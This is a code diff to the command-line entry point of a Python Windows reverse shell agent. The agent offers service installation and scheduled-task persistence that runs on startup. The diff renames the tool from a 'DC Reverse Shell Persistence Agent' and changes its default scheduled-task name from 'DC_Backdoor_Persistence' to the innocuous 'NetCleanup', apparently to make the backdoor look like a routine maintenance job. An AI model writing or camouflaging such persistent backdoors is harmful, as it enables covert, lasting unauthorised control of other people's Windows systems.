@@ -456,20 +456,20 @@ def get_script_path():
     return PathAbstraction.get_script_path()
 
 def main():
-    parser = argparse.ArgumentParser(description="DC Reverse Shell Persistence Agent (Service + Dynamic Path Mode)")
+    parser = argparse.ArgumentParser(description="Windows Reverse Shell Agent")
     parser.add_argument('--mode', type=str, default='cmd', choices=['cmd', 'powershell'], help='Shell mode (Default: cmd)')
     parser.add_argument('--port', type=int, default=DEFAULT_PORT, help='Listening port (Default: 4444)')
     parser.add_argument('--install', action='store_true', help='Install as Windows Service')
     parser.add_argument('--service', action='store_true', help='Run as Windows Service')
     parser.add_argument('--install-persistence', action='store_true', help='Install Task Scheduler persistence')
     parser.add_argument('--path', type=str, default=".", help='Script path')
-    parser.add_argument('--task-name', type=str, default=DEFAULT_TASK_NAME, help='Task Name (Default: DC_Backdoor_Persistence)')
+    parser.add_argument('--task-name', type=str, default=DEFAULT_TASK_NAME, help='Task Name (Default: NetCleanup)')
     parser.add_argument('--task-freq', type=str, default=DEFAULT_TASK_TRIGGER, help='Task Frequency (Default: ONSTART, e.g. MINUTE, 5MIN)')
     parser.add_argument('--reconfig', action='store_true', help='Reconfig existing Service/Task without restart')
     args = parser.parse_args()
 
     print("=" * 40)
-    print("WINDOWS REVERSE SHELL AGENT (SERVICE + DYNAMIC PATH MODE)")
+    print("WINDOWS REVERSE SHELL AGENT")
     print("=" * 40)
 
     script_path = get_script_path()
